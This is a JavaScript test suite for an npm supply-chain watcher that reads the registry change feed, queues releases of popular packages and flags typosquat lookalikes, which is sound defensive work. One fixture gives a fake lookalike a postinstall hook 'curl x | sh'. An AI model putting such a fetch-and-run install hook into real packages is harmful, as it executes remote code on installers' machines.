/**
 * Apollo Live: the feed, the selection, the queue, and the loop that ties them.
 *
 *   node firehose/firehose.test.js
 *
 * Nothing here reaches npm or Nebius — fetch and runPair are handed in. What is tested is each way
 * a watcher that runs for days can quietly lie: skipping part of the feed, losing a job across a
 * restart, recording "not watched" as "nothing changed", running a suspected imitation, or counting
 * a release twice.
 */
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { readChanges } = require('./feed');
const { newReleases, publishSignals, lookalikeIndex, lookalike, describeLookalike, distance } = require('./select');
const { Queue } = require('./queue');
const { pollOnce, workOnce, CDN_GRACE_MS } = require('./index');

let passed = 0;
const it = async (name, fn) => {
  try { await fn(); passed++; console.log('  ok  ', name); } catch (e) { console.error('  FAIL', name, '\n       ', e.message); process.exitCode = 1; }
};
const res = (status, body) => ({ ok: status >= 200 && status < 300, status, json: async () => body });
const noSleep = async () => {};
const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'firehose-'));

const T0 = Date.parse('2026-09-26T12:00:00Z');
const iso = (ms) => new Date(ms).toISOString();

/** A packument as npm serves it: versions, publish times, publishers, provenance, scripts. */
function pk(name, versions, extra = {}) {
  const time = { created: iso(T0 - 400 * 86400000), modified: iso(T0) };
  const vs = {};
  for (const [v, at, meta = {}] of versions) {
    time[v] = iso(at);
    if (!meta.unpublished) vs[v] = { name, version: v, _npmUser: { name: meta.by || 'ci-bot' }, dist: meta.provenance ? { attestations: { url: 'x' } } : {}, scripts: meta.scripts || {}, dependencies: meta.deps || {} };
  }
  return { name, 'dist-tags': { latest: versions[versions.length - 1][0] }, versions: vs, time, ...extra };
}

(async () => {
  console.log('firehose');

  await it('the feed is read from a position, and a busy npm is waited out rather than skipped', async () => {
    const calls = [];
    const fetchImpl = async (url) => {
      calls.push(url);
      return calls.length < 3 ? res(429, {}) : res(200, { results: [{ seq: 11, id: 'a', changes: [] }], last_seq: 11 });
    };
    const out = await readChanges({ since: 10, fetchImpl, sleep: noSleep });
    assert.equal(out.lastSeq, 11);
    assert.equal(calls.length, 3, 'a 429 was treated as the end of the feed');
    assert.ok(calls[0].includes('since=10'));
    // An empty batch never moves the position backwards.
    const empty = await readChanges({ since: 50, fetchImpl: async () => res(200, { results: [], last_seq: 0 }), sleep: noSleep });
    assert.equal(empty.lastSeq, 50);
    // And a feed that will not answer is an error someone sees, not a quiet afternoon.
    await assert.rejects(readChanges({ since: 1, fetchImpl: async () => res(503, {}), sleep: noSleep, attempts: 2 }), /would not answer/);
  });

  await it('only stable releases published since the last look are new; prereleases, unpublished and first releases are counted, not watched', () => {
    const p = pk('left-pad', [
      ['1.0.0', T0 - 900000], ['1.0.1', T0 - 800000], ['1.1.0', T0 + 60000], ['2.0.0-beta.1', T0 + 70000],
      ['1.1.1', T0 + 80000, { unpublished: true }], ['0.9.9', T0 + 90000],
    ]);
    const out = newReleases(p, { after: iso(T0) });
    assert.deepEqual(out.releases.map((r) => [r.version, r.prior]), [['1.1.0', '1.0.1']]);
    assert.equal(out.prerelease, 1);
    assert.equal(out.unpublished, 1);
    assert.equal(out.noPrior, 1, '0.9.9 has no stable release below it and was not reported as such');
    // A backport is compared with the release below it on its own line.
    const back = newReleases(pk('x', [['3.4.8', T0 - 5000], ['4.2.0', T0 - 4000], ['3.4.9', T0 + 1000]]), { after: iso(T0) });
    assert.deepEqual(back.releases.map((r) => [r.version, r.prior]), [['3.4.9', '3.4.8']]);
    // Nothing new is nothing new.
    assert.equal(newReleases(p, { after: iso(T0 + 100000) }).releases.length, 0);
  });

  await it('the publish itself is described — a new publisher, provenance lost, an install script added — as signals, never a verdict', () => {
    const p = pk('chalkish', [
      ['5.0.0', T0 - 3000, { by: 'ci-bot', provenance: true }],
      ['5.0.1', T0 - 2000, { by: 'ci-bot', provenance: true }],
      ['5.0.2', T0 + 1000, { by: 'someone-new', scripts: { postinstall: 'node setup.js' }, deps: { 'tiny-helper': '^1.0.0' } }],
    ]);
    const s = publishSignals(p, '5.0.2', '5.0.1').map((x) => x.signal).sort();
    assert.deepEqual(s, ['dependencies-added', 'install-script-added', 'new-publisher', 'provenance-dropped']);
    // A routine release from the usual publisher, provenance intact, says nothing.
    const quiet = pk('calm', [['1.0.0', T0 - 2000, { by: 'ci-bot', provenance: true }], ['1.0.1', T0 + 1000, { by: 'ci-bot', provenance: true }]]);
    assert.deepEqual(publishSignals(quiet, '1.0.1', '1.0.0'), []);
    // No field anywhere names a severity: that is the differ's alone.
    assert.ok(!/severity/.test(JSON.stringify(publishSignals(p, '5.0.2', '5.0.1'))));
  });

  await it('lookalikes: a typo, moved punctuation, a borrowed name under a scope — and not @types, short names or the real thing', () => {
    const idx = lookalikeIndex(['lodash', 'express', 'core-js', 'react', 'ms', 'chalk']);
    assert.deepEqual(lookalike('lodahs', idx), { target: 'lodash', kind: 'typo' });
    assert.deepEqual(lookalike('expres', idx), { target: 'express', kind: 'typo' });
    assert.deepEqual(lookalike('corejs', idx), { target: 'core-js', kind: 'separator' });
    assert.deepEqual(lookalike('@someone/lodash', idx), { target: 'lodash', kind: 'scope' });
    assert.equal(lookalike('@types/lodash', idx), null, '@types is a convention, not an imitation');
    assert.equal(lookalike('lodash', idx), null, 'the real package is not its own imitation');
    assert.equal(lookalike('mz', idx), null, 'one edit from a two-letter name is most of npm');
    assert.equal(lookalike('react-dom-helpers', idx), null);
    assert.equal(distance('chalk', 'chlak'), 1, 'an adjacent swap is one edit');
  });

  await it('a malformed change-feed id does not crash the watch: a non-string name is simply not a lookalike', () => {
    // `name` is `change.id` off the feed, read on every change for days, and the call is outside the
    // loop's try/catch. npm sends string ids, but a design doc or a corrupt batch can carry another
    // shape, and squash() calling .toLowerCase() on it would take the whole poll loop down.
    const idx = lookalikeIndex(['lodash', 'express']);
    for (const bad of [42, true, ['lodash'], { toString: () => 'lodash' }, null, undefined, '']) {
      assert.equal(lookalike(bad, idx), null, `a ${typeof bad} name should be no match, not a throw`);
    }
    // And a hostile packument whose dependencies field is a string, not an object, is described with
    // no dependencies rather than the characters of that string counted as package names.
    const d = describeLookalike({ name: 'x', 'dist-tags': { latest: '1' }, versions: { 1: { dependencies: 'not-an-object' } } }, { target: 'lodash', kind: 'typo' });
    assert.deepEqual(d.dependencies, []);
  });

  await it('a lookalike is described from its metadata — install script, no repository, copied description', () => {
    const p = { ...pk('lodahs', [['1.0.0', T0 - 1000, { scripts: { preinstall: 'node x.js' } }]]), description: 'Lodash modular utilities.' };
    p.time.created = iso(T0 - 86400000);
    const d = describeLookalike(p, { target: 'lodash', kind: 'typo' }, 'Lodash modular utilities.');
    assert.equal(d.imitates, 'lodash');
    assert.deepEqual(d.signals, ['runs a script on install', 'names no source repository', "copies lodash's description word for word"]);
  });

  await it('the queue survives a restart: jobs, position, and anything that was running, which goes back rather than being called done', () => {
    const dir = tmp();
    const a = new Queue(dir);
    a.state.seq = 100;
    a.enqueue({ key: 'x@1.0.0→1.0.1', pkg: 'x', weeklyDownloads: 5, seenAt: iso(T0) });
    a.enqueue({ key: 'y@1.0.0→1.0.1', pkg: 'y', weeklyDownloads: 50, seenAt: iso(T0) });
    a.save();
    const taken = a.take(T0);
    assert.equal(taken.pkg, 'y', 'the most-downloaded release is not the one watched first');
    // The process dies here, mid-pair.
    const b = new Queue(dir);
    assert.equal(b.state.seq, 100);
    assert.equal(b.recover(), 1);
    assert.deepEqual(b.state.pending.map((j) => j.pkg).sort(), ['x', 'y']);
    assert.equal(b.enqueue({ key: 'x@1.0.0→1.0.1', pkg: 'x' }), false, 'the same release was queued twice');
  });

  await it('a job is not due before npm\'s CDN can serve it, and every finished job is appended to the evidence', () => {
    const dir = tmp();
    const q = new Queue(dir);
    q.enqueue({ key: 'z@1→2', pkg: 'z', seenAt: iso(T0), notBefore: iso(T0 + CDN_GRACE_MS) });
    assert.equal(q.take(T0), null, 'a job was started before its release could be installed');
    const j = q.take(T0 + CDN_GRACE_MS);
    q.finish(j.key, { key: j.key, outcome: 'watched' });
    const lines = fs.readFileSync(path.join(dir, 'results.jsonl'), 'utf8').trim().split('\n');
    assert.equal(lines.length, 1);
    assert.equal(q.status().done, 1);
  });

  /** A tiny npm: a feed and some packuments. */
  function fakeNpm({ changes, packuments, failing = new Set() }) {
    const hits = [];
    const fetchImpl = async (url) => {
      hits.push(url);
      if (url.includes('/_changes')) {
        const since = Number(/since=(\d+)/.exec(url)[1]);
        const results = changes.filter((c) => c.seq > since);
        return res(200, { results, last_seq: results.length ? results[results.length - 1].seq : since });
      }
      const name = decodeURIComponent(url.replace('https://registry.npmjs.org/', '').replace(/\/latest$/, ''));
      if (failing.has(name)) return res(500, {});
      if (url.endsWith('/latest')) return res(200, { description: packuments[name.replace(/\/latest$/, '')]?.description || null });
      return packuments[name] ? res(200, packuments[name]) : res(404, {});
    };
    return { fetchImpl, hits };
  }

  await it('a poll queues the new releases of watched packages and saves them with the new position, in one write', async () => {
    const dir = tmp();
    const q = new Queue(dir);
    q.state.seq = 0;
    q.state.startedAt = iso(T0);
    const npm = fakeNpm({
      changes: [{ seq: 1, id: 'express', changes: [] }, { seq: 2, id: 'not-watched', changes: [] }, { seq: 3, id: 'gone', deleted: true, changes: [] }],
      packuments: { express: pk('express', [['5.1.0', T0 - 5000], ['5.1.1', T0 + 30000, { by: 'ci-bot' }]]) },
    });
    const population = new Map([['express', 9e7]]);
    const r = await pollOnce(q, { population, lookIdx: lookalikeIndex(['express']), fetchImpl: npm.fetchImpl, sleep: noSleep, now: T0 + 60000 });
    assert.equal(r.jobs, 1);
    const saved = new Queue(dir);
    assert.equal(saved.state.seq, 3, 'the position was not saved');
    assert.equal(saved.state.pending[0].key, 'express@5.1.0→5.1.1', 'the job was not saved with it');
    assert.equal(saved.state.pending[0].notBefore, iso(T0 + 30000 + CDN_GRACE_MS));
    // Reading the same batch again — what happens after a crash — adds nothing.
    saved.state.seq = 0;
    const again = await pollOnce(saved, { population, lookIdx: lookalikeIndex(['express']), fetchImpl: npm.fetchImpl, sleep: noSleep, now: T0 + 90000 });
    assert.equal(again.jobs, 0, 'a re-read batch queued the same release twice');
  });

  await it('a packument npm will not serve neither blocks the feed nor vanishes: it is set aside and tried again', async () => {
    const dir = tmp();
    const q = new Queue(dir);
    q.state.seq = 0;
    q.state.startedAt = iso(T0);
    const packuments = { axios: pk('axios', [['1.7.0', T0 - 5000], ['1.7.1', T0 + 1000]]) };
    const failing = new Set(['axios']);
    const npm = fakeNpm({ changes: [{ seq: 1, id: 'axios', changes: [] }, { seq: 2, id: 'other', changes: [] }], packuments, failing });
    const population = new Map([['axios', 1e8]]);
    await pollOnce(q, { population, lookIdx: null, fetchImpl: npm.fetchImpl, sleep: noSleep, now: T0 + 10000 });
    assert.equal(q.state.seq, 2, 'one unreadable package held the whole feed');
    assert.ok(q.state.unread.axios, 'the unreadable package was forgotten');
    failing.clear();
    const r = await pollOnce(q, { population, lookIdx: null, fetchImpl: npm.fetchImpl, sleep: noSleep, now: T0 + 20000 });
    assert.equal(r.jobs, 1);
    assert.deepEqual(q.state.unread, {});
  });

  await it('a new lookalike is recorded and NEVER queued to run; an old package with a similar name is not news', async () => {
    const dir = tmp();
    const q = new Queue(dir);
    q.state.seq = 0;
    q.state.startedAt = iso(T0);
    const fresh = pk('expres', [['1.0.0', T0 - 1000, { scripts: { postinstall: 'curl x | sh' } }]]);
    fresh.time.created = iso(T0 - 3600000);
    const old = pk('expresss', [['1.0.0', T0 - 1000]]);
    old.time.created = iso(T0 - 900 * 86400000);
    const npm = fakeNpm({ changes: [{ seq: 1, id: 'expres', changes: [] }, { seq: 2, id: 'expresss', changes: [] }], packuments: { expres: fresh, expresss: old, express: { description: 'Fast web framework' } } });
    await pollOnce(q, { population: new Map([['express', 9e7]]), lookIdx: lookalikeIndex(['express']), fetchImpl: npm.fetchImpl, sleep: noSleep, now: T0 });
    const found = fs.readFileSync(path.join(dir, 'lookalikes.jsonl'), 'utf8').trim().split('\n').map((l) => JSON.parse(l));
    assert.deepEqual(found.map((f) => f.name), ['expres']);
    assert.ok(found[0].signals.includes('runs a script on install'));
    assert.equal(q.state.pending.length, 0, 'a suspected imitation was queued to be RUN');
  });

  await it('a popular name under a scope is listed only with a reason on top — an adapter like @traceora/express is counted, not accused', async () => {
    const dir = tmp();
    const q = new Queue(dir);
    q.state.seq = 0;
    q.state.startedAt = iso(T0);
    const adapter = pk('@traceora/express', [['0.1.6', T0 - 1000]]);
    adapter.time.created = iso(T0 - 3600000);
    adapter.versions['0.1.6'].repository = { url: 'https://github.com/zuhaib-dev/traceora.git' };
    const squat = pk('@someone/express', [['1.0.0', T0 - 1000, { scripts: { postinstall: 'node x' } }]]);
    squat.time.created = iso(T0 - 3600000);
    const kit = pk('@streetui/express', [['0.1.0', T0 - 1000]]);
    kit.time.created = iso(T0 - 3600000);
    const npm = fakeNpm({ changes: [{ seq: 1, id: '@traceora/express', changes: [] }, { seq: 2, id: '@someone/express', changes: [] }, { seq: 3, id: '@streetui/express', changes: [] }], packuments: { '@traceora/express': adapter, '@someone/express': squat, '@streetui/express': kit, express: { description: 'Fast web framework' } } });
    await pollOnce(q, { population: new Map([['express', 9e7]]), lookIdx: lookalikeIndex(['express']), fetchImpl: npm.fetchImpl, sleep: noSleep, now: T0 });
    const found = fs.readFileSync(path.join(dir, 'lookalikes.jsonl'), 'utf8').trim().split('\n').map((l) => JSON.parse(l).name);
    assert.deepEqual(found, ['@someone/express']);
    assert.equal(q.state.counts['lookalike-scope-plain'], 2, 'the filtered packages were not counted — a missing repository field alone listed one');
  });

  await it('a registry document older than the revision the feed announced is stale: asked again later, never believed', async () => {
    // mailauth 6.0.0: read the moment the feed announced it, answered with the pre-publish document,
    // recorded as "no release", and never looked at again. The first live audit found it missing.
    const dir = tmp();
    const q = new Queue(dir);
    q.state.seq = 0;
    q.state.startedAt = iso(T0);
    const old = { ...pk('mailauth', [['5.0.3', T0 - 86400000]]), _rev: '41-aaa' };
    const fresh = { ...pk('mailauth', [['5.0.3', T0 - 86400000], ['6.0.0', T0 + 60000]]), _rev: '42-bbb' };
    let serve = old;
    const npm = fakeNpm({ changes: [{ seq: 1, id: 'mailauth', changes: [{ rev: '42-bbb' }] }], packuments: { get mailauth() { return serve; } } });
    const population = new Map([['mailauth', 5e5]]);
    await pollOnce(q, { population, lookIdx: null, fetchImpl: npm.fetchImpl, sleep: noSleep, now: T0 + 70000 });
    assert.equal(q.state.pending.length, 0);
    assert.ok(q.state.stale.mailauth, 'the stale document was believed');
    assert.equal(q.state.watermarks.mailauth, undefined, 'a stale document moved the watermark past the release');
    serve = fresh;
    await pollOnce(q, { population, lookIdx: null, fetchImpl: npm.fetchImpl, sleep: noSleep, now: T0 + 70000 + 30000 });
    assert.equal(q.state.pending.length, 0, 'retried before its time');
    await pollOnce(q, { population, lookIdx: null, fetchImpl: npm.fetchImpl, sleep: noSleep, now: T0 + 70000 + 61000 });
    assert.deepEqual(q.state.pending.map((j) => j.key), ['mailauth@5.0.3→6.0.0']);
    assert.deepEqual(q.state.stale, {});
  });

  await it('a document that stays stale ends as "not watched" with the reason — in the evidence, not in silence', async () => {
    const dir = tmp();
    const q = new Queue(dir);
    q.state.seq = 0;
    q.state.startedAt = iso(T0);
    const old = { ...pk('x-lib', [['1.0.0', T0 - 86400000]]), _rev: '3-a' };
    const npm = fakeNpm({ changes: [{ seq: 1, id: 'x-lib', changes: [{ rev: '4-b' }] }], packuments: { 'x-lib': old } });
    let t = T0;
    for (let i = 0; i < 8; i++) { await pollOnce(q, { population: new Map([['x-lib', 1]]), lookIdx: null, fetchImpl: npm.fetchImpl, sleep: noSleep, now: t }); t += 30 * 60000; }
    const lines = fs.readFileSync(path.join(dir, 'results.jsonl'), 'utf8').trim().split('\n').map((l) => JSON.parse(l));
    assert.equal(lines.length, 1);
    assert.equal(lines[0].outcome, 'unobserved');
    assert.match(lines[0].error, /kept serving revision 3-a after the feed announced 4-b/);
  });

  await it('a re-check asked for from outside is picked up by the watcher that owns the state', async () => {
    const dir = tmp();
    const q = new Queue(dir);
    q.state.seq = 0;
    q.state.startedAt = iso(T0);
    fs.writeFileSync(path.join(dir, 'recheck.json'), JSON.stringify(['left-pad']));
    const npm = fakeNpm({ changes: [], packuments: { 'left-pad': pk('left-pad', [['1.0.0', T0 - 5000], ['1.0.1', T0 + 1000]]) } });
    const r = await pollOnce(q, { population: new Map([['left-pad', 9]]), lookIdx: null, fetchImpl: npm.fetchImpl, sleep: noSleep, now: T0 + 5000 });
    assert.equal(r.jobs, 1);
    assert.ok(!fs.existsSync(path.join(dir, 'recheck.json')), 'the request was left to be read again');
  });

  await it('a watched pair records publish, seen and verdict times; "not watched" is its own outcome, never "no change"', async () => {
    const dir = tmp();
    const q = new Queue(dir);
    q.enqueue({ key: 'a@1.0.0→1.0.1', pkg: 'a', from: '1.0.0', to: '1.0.1', publishedAt: iso(T0), seenAt: iso(T0 + 60000) });
    let clock = T0 + 3 * 60000;
    const now = () => clock;
    const ok = await workOnce(q, { strategy: 'nodert', now, runPairImpl: async () => { clock += 45000; return { diff: { severity: 'none', reasons: [], changed: false } }; } });
    assert.equal(ok.outcome, 'watched');
    assert.equal(ok.minutesPublishToVerdict, 3.8);
    assert.equal(ok.seconds, 45);

    q.enqueue({ key: 'b@1→2', pkg: 'b', from: '1', to: '2', publishedAt: iso(T0), seenAt: iso(T0) });
    const unseen = await workOnce(q, { strategy: 'nodert', now, runPairImpl: async () => { const e = new Error('Not watched: b@2 never installed (EBADPLATFORM). That is not the same as clean.'); e.code = 'UNOBSERVED'; throw e; } });
    assert.equal(unseen.outcome, 'unobserved');
    assert.equal(unseen.severity, undefined, 'a pair nobody watched was given a severity');
  });

  await it('a release npm\'s CDN cannot serve yet is retried twice, later, before it is recorded as not watched', async () => {
    const dir = tmp();
    const q = new Queue(dir);
    q.enqueue({ key: 'c@1→2', pkg: 'c', from: '1', to: '2', publishedAt: iso(T0), seenAt: iso(T0) });
    let clock = T0;
    const now = () => clock;
    const notThere = async () => { const e = new Error('Not watched: c@2 never installed (ETARGET).'); e.code = 'UNOBSERVED'; throw e; };
    const outcomes = [];
    for (let i = 0; i < 3; i++) {
      const r = await workOnce(q, { strategy: 'nodert', now, runPairImpl: notThere });
      outcomes.push(r.outcome);
      clock += 60 * 60000;
    }
    assert.deepEqual(outcomes, ['retrying', 'retrying', 'unobserved']);
    assert.equal(q.status().done, 1);
    assert.equal(await workOnce(q, { strategy: 'nodert', now, runPairImpl: notThere }), null, 'nothing left, and nothing invented');
  });

  console.log(`\n${passed} passed`);
})();
